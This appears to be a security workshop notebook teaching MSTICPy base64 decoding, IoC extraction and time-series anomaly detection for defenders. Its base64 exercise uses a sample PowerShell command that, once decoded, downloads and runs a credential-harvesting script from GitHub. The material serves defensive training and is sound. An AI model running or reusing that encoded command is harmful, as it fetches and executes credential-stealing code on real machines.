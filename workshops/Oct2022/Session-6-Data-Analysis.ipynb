{
 "cells": [
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## MSTICPy and Notebooks in InfoSec\n",
    "\n",
    "---\n",
    "\n",
    "<h1 style=\"border: solid; padding:5pt; color:black; background-color:#909090\">Session 6 - Data analysis</h1>\n",
    "\n",
    "---\n",
    "\n",
    "## What this session covers:\n",
    "\n",
    "* Data Analysis capabilities in msticpy\n",
    "* Base 64 decoding\n",
    "* IoC Extraction\n",
    "* Outlier detection using Time Series Analysis\n",
    "\n",
    "\n",
    "## Prerequisites\n",
    "- Python >= 3.8 Environment\n",
    "- Jupyter installed\n",
    "- MSTICPy installed\n",
    "\n",
    "## Recommended\n",
    "- VS Code\n"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "---\n",
    "\n",
    "# <a style=\"border: solid; padding:5pt; color:black; background-color:#909090\">Data Analysis capabilities in msticpy</a>\n",
    "\n",
    "---\n",
    "\n",
    "MSTICPy has several generic analysis and transformation functions. Some examples of transforms are:\n",
    "- Process tree building\n",
    "- decoding encoded and compressed data\n",
    "- IoC/observable extraction from data\n",
    "- Time series analysis\n",
    "- syslog parsing\n",
    "\n",
    "You can read more about the features in MSTICPy documentation.\n",
    " - [Data Analysis](https://msticpy.readthedocs.io/en/latest/DataAnalysis.html)\n",
    " - [Process Trees](https://msticpy.readthedocs.io/en/latest/visualization/ProcessTree.html)"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {
    "ExecuteTime": {
     "end_time": "2022-10-17T18:18:33.520024Z",
     "start_time": "2022-10-17T18:18:33.503259Z"
    }
   },
   "source": [
    "---\n",
    "\n",
    "# <a style=\"border: solid; padding:5pt; color:black; background-color:#909090\">Base 64 decoding using msticpy</a>\n",
    "\n",
    "---\n",
    "\n",
    "Often, Defenders have to bulk analyze the process execution commandline logs containing base64 encoded strings by decoding and analyzing them for malicious activity. \n",
    "This msticpy module allows you to extract base64 encoded content from a string or columns of Pandas DataFrame. \n",
    "\n",
    "Read more details - \n",
    "[Base64 Decoding and Unpacking](https://msticpy.readthedocs.io/en/latest/data_analysis/Base64Unpack.html)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "%env MSTICPYCONFIG=./msticpyconfig.yaml\n",
    "import msticpy as mp \n",
    "mp.init_notebook()\n",
    "pd.set_option('display.max_colwidth', 200)"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "In order to find module path, you can use search feature as shows below"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {
    "ExecuteTime": {
     "end_time": "2022-10-18T10:49:23.600032Z",
     "start_time": "2022-10-18T10:49:23.584743Z"
    }
   },
   "outputs": [],
   "source": [
    "mp.search('base64')"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "Once you identified the module path, you can use either on a input string or columns of Padas dataframe.\n",
    "\n",
    "Exmaple powershell command string with base64 encoded data. We can put this as input in next step.\n",
    "\n",
    "`powershell -enc SUVYIChOZXctT2JqZWN0IE5ldC5XZWJDbGllbnQpLkRvd25sb2FkU3RyaW5nKCdodHRwczovL3Jhdy5naXRodWJ1c2VyY29udGVudC5jb20vcHV0dGVycGFuZGEvbWltaWtpdHRlbnovbWFzdGVyL0ludm9rZS1taW1pa2l0dGVuei5wczEnKTsgSW52b2tlLW1pbWlraXR0ZW56Cg==`"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {
    "ExecuteTime": {
     "end_time": "2022-10-18T10:49:41.410325Z",
     "start_time": "2022-10-18T10:49:41.397106Z"
    }
   },
   "outputs": [],
   "source": [
    "cmdline = mp.nbwidgets.GetText(prompt='Enter a commandline with powershell base64 encoded', auto_display=True);"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "in order to decode, you can use `unpack` method within `base64unpack` tranform module/\n",
    "The library returns following information.\n",
    "- decoded string (if decodable to utf-8 or utf-16)\n",
    "- hashes of the decoded segment (MD5, SHA1, SHA256)\n",
    "- string of printable byte values (e.g. for submission to a disassembler)\n",
    "- the detected decoded file type (limited)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {
    "ExecuteTime": {
     "end_time": "2022-10-18T10:49:52.856745Z",
     "start_time": "2022-10-18T10:49:52.841886Z"
    }
   },
   "outputs": [],
   "source": [
    "# Decode the string\n",
    "base64_dec_str = mp.transform.base64unpack.unpack(input_string=cmdline.value)\n",
    "\n",
    "# Print decoded string\n",
    "display(base64_dec_str[0])"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {
    "ExecuteTime": {
     "end_time": "2022-10-18T10:49:58.535524Z",
     "start_time": "2022-10-18T10:49:58.527773Z"
    }
   },
   "outputs": [],
   "source": [
    "# Print decoded string\n",
    "display(base64_dec_str[1]['decoded_string'][0])"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## <a style=\"border: solid; padding:5pt; color:black; background-color:#309030\">Task 1 - Base 64 decoding using dataframe as input</a>\n",
    "\n",
    "Perform base 64 encoding on the data loaded from previous step.\n",
    "1. Choose the columns containing powershell base64 command line logs.\n",
    "2. Use python help (`process_enc_logs.mp.b64unpack` or `mp.transform.base64unpack.unpack_df`)\n",
    "   to find correct parameters such as input data and column name.\n",
    "3. Finally display the results\n",
    "\n",
    "<br>\n",
    "<details>\n",
    "<summary>Hints...</summary>\n",
    "<li>Use the cell below to identify the columns containing powershell base64 encoded logs.</li>\n",
    "<li>Use data and column to specify input dataframe and column containing powershell command line</li>\n",
    "<li>The final command to decode should look like one of the following.\n",
    "\n",
    "<pre>\n",
    "    # using the pandas msticpy accessor\n",
    "    process_enc_logs.mp.b64extract(column='CommandLine')\n",
    "</pre>\n",
    "\n",
    "<pre>\n",
    "    # using the standalone function\n",
    "    mp.transform.base64unpack.unpack_df(data=process_enc_logs, column='CommandLine')\n",
    "</pre>\n",
    "</li>\n",
    "<ul>\n",
    "</ul>\n",
    "</details>"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {
    "ExecuteTime": {
     "end_time": "2022-10-18T10:50:39.999012Z",
     "start_time": "2022-10-18T10:50:39.893771Z"
    }
   },
   "outputs": [],
   "source": [
    "# Load test data\n",
    "process_logs = pd.read_pickle('data/processes_on_host.pkl')\n",
    "# Filter the records with powershell base 64 encoded data\n",
    "process_enc_logs = process_logs[process_logs['CommandLine'].str.contains(\"-enc\")]\n",
    "process_enc_logs"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {
    "ExecuteTime": {
     "end_time": "2022-10-18T09:15:27.727138Z",
     "start_time": "2022-10-18T09:15:27.699932Z"
    }
   },
   "outputs": [],
   "source": [
    "# specify the data and column parameters using mp transform\n",
    "dec_df = \n",
    "\n",
    "# display dataframe\n",
    "display(dec_df)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "# specify the column parameters using msticpy accessor\n",
    "dec_df = \n",
    "\n",
    "# display dataframe\n",
    "display(dec_df)"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {
    "ExecuteTime": {
     "end_time": "2022-10-17T18:21:27.532198Z",
     "start_time": "2022-10-17T18:21:27.526776Z"
    }
   },
   "source": [
    "---\n",
    "\n",
    "# <a style=\"border: solid; padding:5pt; color:black; background-color:#909090\">IoC extraction using msticpy</a>\n",
    "\n",
    "---\n",
    "\n",
    "This module allows you to extract IoC patterns from a string or a DataFrame. This will be useful feature for defender for faster extraction and perform follow-up activities on those IoCs.\n",
    "\n",
    "For more detail - [IoC Extraction](https://msticpy.readthedocs.io/en/latest/data_analysis/IoCExtract.html)"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "You can use this module similar fashion either by providing input string or passing a dataframe with multiple logs containing IoCs.\n",
    "\n",
    "Enter sample command line in the next cell to see how it works. \n",
    "`netsh  start capture=yes IPv4.Address=1.2.3.4 tracefile=C:\\\\Users\\\\user\\\\AppData\\\\Local\\\\Temp\\\\bzzzzzz.txt`"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {
    "ExecuteTime": {
     "end_time": "2022-10-18T10:50:50.702927Z",
     "start_time": "2022-10-18T10:50:50.688563Z"
    }
   },
   "outputs": [],
   "source": [
    "cmdline = mp.nbwidgets.GetText(prompt='Enter a commandline to extract IoCs', auto_display=True);"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "You can use the `extract` method from `iocextract` class and provide input string."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {
    "ExecuteTime": {
     "end_time": "2022-10-18T10:51:32.418188Z",
     "start_time": "2022-10-18T10:51:32.403798Z"
    }
   },
   "outputs": [],
   "source": [
    "# Find the module path\n",
    "mp.search('ioc')"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {
    "ExecuteTime": {
     "end_time": "2022-10-18T10:51:07.673646Z",
     "start_time": "2022-10-18T10:51:07.657997Z"
    }
   },
   "outputs": [],
   "source": [
    "ioc_extractor = mp.transform.IoCExtract()\n",
    "\n",
    "# any IoCs in the string?\n",
    "iocs_found = ioc_extractor.extract(cmdline.value)\n",
    "\n",
    "if iocs_found:\n",
    "    print('\\nPotential IoCs found in alert process:')\n",
    "    display(iocs_found)"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {
    "ExecuteTime": {
     "end_time": "2022-10-17T18:22:13.457405Z",
     "start_time": "2022-10-17T18:22:13.452500Z"
    }
   },
   "source": [
    "## <a style=\"border: solid; padding:5pt; color:black; background-color:#309030\">Task 2 - Extract IoCs from log dataset</a>\n",
    "\n",
    "Perform IoC extraction on the data loaded from previous step (process_enc_logs).\n",
    "1. Choose the columns containing command line logs which may have IoCs and need to be extracted.\n",
    "2. Use either of these (use Python help to find correct parameters such as input data and column name):\n",
    "   - the DataFrame accessor process_enc_logs.mp.iocextract() function\n",
    "   - the `extract` method of the `mp.transform.IoCextractor` class\n",
    "3. Finally display the results\n",
    "\n",
    "\n",
    "<br>\n",
    "<details>\n",
    "<summary>Hints...</summary>\n",
    "<li>Use the cell below to identify the columns containing powershell base64 encoded logs.</li>\n",
    "<li>Use data and column to specify input dataframe and column containing powershell commandline</li>\n",
    "<li>Use the DataFrame accessor\n",
    "<pre>\n",
    "    process_logs.mp.ioc_extract(columns='CommandLine')\n",
    "</pre>\n",
    "</li>\n",
    "<li>Or use the IoCExtract class method\n",
    "<pre>\n",
    "    ioc_extractor.extract(data=process_logs, columns=['CommandLine'])\n",
    "</pre>\n",
    "</li>\n",
    "<ul>\n",
    "</ul>\n",
    "</details>\n"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {
    "ExecuteTime": {
     "end_time": "2022-10-18T09:06:46.721439Z",
     "start_time": "2022-10-18T09:06:44.863271Z"
    }
   },
   "outputs": [],
   "source": [
    "# Use the standalone function of IoCExtract class. specify data and columns\n",
    "ioc_df = \n",
    "\n",
    "if len(ioc_df):\n",
    "    display(HTML(\"<h3>IoC patterns found in process tree.</h3>\"))\n",
    "    display(ioc_df[ioc_df['IoCType']=='url'])"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "#Use the dataframe accessor and specify columns\n",
    "ioc_df = \n",
    "\n",
    "if len(ioc_df):\n",
    "    display(HTML(\"<h3>IoC patterns found in process tree.</h3>\"))\n",
    "    display(ioc_df[ioc_df['IoCType']=='ipv4'])"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "---\n",
    "\n",
    "# <a style=\"border: solid; padding:5pt; color:black; background-color:#909090\">Time Series analysis using msticpy</a>\n",
    "\n",
    "---\n",
    "\n",
    "MSTICPy has functions to calculate and display time series decomposition results. These can be useful to spot time-based anomalies in something that has a predictable seasonal pattern\n",
    "\n",
    "Fore more details , check the documentation\n",
    "[Time Series Analysis](https://msticpy.readthedocs.io/en/latest/visualization/TimeSeriesAnomalies.html)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {
    "ExecuteTime": {
     "end_time": "2022-10-18T10:51:41.963112Z",
     "start_time": "2022-10-18T10:51:41.949699Z"
    }
   },
   "outputs": [],
   "source": [
    "mp.search('timeseries')"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "MSTICPy has a number of built-in queries for MS Sentinel to support time series analysis.\n",
    "\n",
    "- MultiDataSource.get_timeseries_anomalies\n",
    "- MultiDataSource.get_timeseries_data\n",
    "- MultiDataSource.get_timeseries_decompose\n",
    "- MultiDataSource.plot_timeseries_datawithbaseline\n",
    "- MultiDataSource.plot_timeseries_scoreanomolies\n",
    "\n",
    "To use these you will need to connect to sentinel workspace\n",
    "\n",
    "`# Authentication\n",
    "qry_prov = mp.QueryProvider(\"MSSentinel\")\n",
    "qry_prov.connect(mp.WorkspaceConfig(workspace=\"cybersecuritysoc\"))`\n",
    "\n",
    "An example of running the query against connected sentinel workspace and retrieve the time series data.\n",
    "\n",
    "```\n",
    "#Specify start and end timestamps\n",
    "start='2022-09-01 00:00:00.000000'\n",
    "end='2020-10-01 00:00:00.000000'\n",
    "\n",
    "#Execute the query by passing required and optional parameters\n",
    "time_series_data = qry_prov.MultiDataSource.get_timeseries_data(\n",
    "    start=start,\n",
    "    end=end,\n",
    "    table=\"CommonSecurityLog\",\n",
    "    timestampcolumn=\"TimeGenerated\",\n",
    "    aggregatecolumn=\"SentBytes\",\n",
    "    groupbycolumn=\"DeviceVendor\",\n",
    "    aggregatefunction=\"sum(SentBytes)\",\n",
    "    where_clause='| where DeviceVendor==\"Fortinet\"',\n",
    "    add_query_items='| mv-expand TimeGenerated to typeof(datetime), SentBytes to typeof(long)',\n",
    ")\n",
    "#display the output\n",
    "time_series_data\n",
    "```"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## <a style=\"border: solid; padding:5pt; color:black; background-color:#309030\">Task 3 - Find outliers using time series analysis on network data</a>\n",
    "\n",
    "Perform Time series analysis on the sample data loaded in the first step.\n",
    "1. from the loaded dataframe, use python help (`ts_df.mp_timeseries.analyze`) to find correct parameters such as data_column, seasonal parameteres if known otherwise keep default.\n",
    "3. Finally plot the time series of the results from previous steps using `ts_decomp_df.mp_timeseries.plot`\n",
    "\n",
    "<br>\n",
    "<details>\n",
    "<summary>Hints...</summary>\n",
    "<li>Use the cell below to identify the columns containing time series numerical data.</li>\n",
    "<li>The final command to do time series should look like:\n",
    "<pre>\n",
    "    ts_df.mp_timeseries.analyze(\n",
    "        # time_column=\"TimeGenerated\"  - if the DF is not indexed by timestamp\n",
    "        data_column=\"TotalBytesSent\",\n",
    "        seasonal=7,\n",
    "        period=24\n",
    "    )\n",
    "</pre>\n",
    "</li>\n",
    "<li>You can also plot the results and outliers using the command.\n",
    "<pre>\n",
    "    ts_decomp_df.mp_timeseries.plot(\n",
    "        y=\"TotalBytesSent\",\n",
    "    );\n",
    "</pre>\n",
    "</li>\n",
    "<ul>\n",
    "</ul>\n",
    "</details>"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {
    "ExecuteTime": {
     "end_time": "2022-10-18T10:53:17.855636Z",
     "start_time": "2022-10-18T10:53:17.841786Z"
    }
   },
   "outputs": [],
   "source": [
    "# Load test data\n",
    "ts_df = pd.read_pickle('data/timeseries.pkl')\n",
    "ts_df"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {
    "ExecuteTime": {
     "end_time": "2022-10-18T09:28:22.664592Z",
     "start_time": "2022-10-18T09:28:22.640775Z"
    }
   },
   "outputs": [],
   "source": [
    "#load the module\n",
    "from msticpy.analysis import timeseries\n",
    "\n",
    "# analyze the time series data and find outliers\n",
    "ts_decomp_df = ts_df.mp_timeseries.analyze(\n",
    "    data_column=\"TotalBytesSent\",\n",
    "    seasonal=7,\n",
    "    period=24\n",
    ")\n",
    "\n",
    "ts_decomp_df"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {
    "ExecuteTime": {
     "end_time": "2022-10-18T09:28:52.974627Z",
     "start_time": "2022-10-18T09:28:52.794512Z"
    }
   },
   "outputs": [],
   "source": [
    "# plot the results retrieved from previous step.\n",
    "ts_decomp_df.mp_timeseries.plot(\n",
    "    y=\"TotalBytesSent\",\n",
    ");"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "---\n",
    "# End of Session\n"
   ]
  }
 ],
 "metadata": {
  "hide_input": false,
  "kernelspec": {
   "display_name": "Python 3 (ipykernel)",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.9.10"
  },
  "toc": {
   "base_numbering": 1,
   "nav_menu": {},
   "number_sections": true,
   "sideBar": true,
   "skip_h1_title": false,
   "title_cell": "Table of Contents",
   "title_sidebar": "Contents",
   "toc_cell": false,
   "toc_position": {},
   "toc_section_display": true,
   "toc_window_display": false
  },
  "varInspector": {
   "cols": {
    "lenName": 16,
    "lenType": 16,
    "lenVar": 40
   },
   "kernels_config": {
    "python": {
     "delete_cmd_postfix": "",
     "delete_cmd_prefix": "del ",
     "library": "var_list.py",
     "varRefreshCmd": "print(var_dic_list())"
    },
    "r": {
     "delete_cmd_postfix": ") ",
     "delete_cmd_prefix": "rm(",
     "library": "var_list.r",
     "varRefreshCmd": "cat(var_dic_list()) "
    }
   },
   "types_to_exclude": [
    "module",
    "function",
    "builtin_function_or_method",
    "instance",
    "_Feature"
   ],
   "window_display": false
  },
  "vscode": {
   "interpreter": {
    "hash": "6095bcd1f13cf4183aa2ae0e347c65ea7e7069a537781621e1c72af4eaf1e436"
   }
  }
 },
 "nbformat": 4,
 "nbformat_minor": 4
}
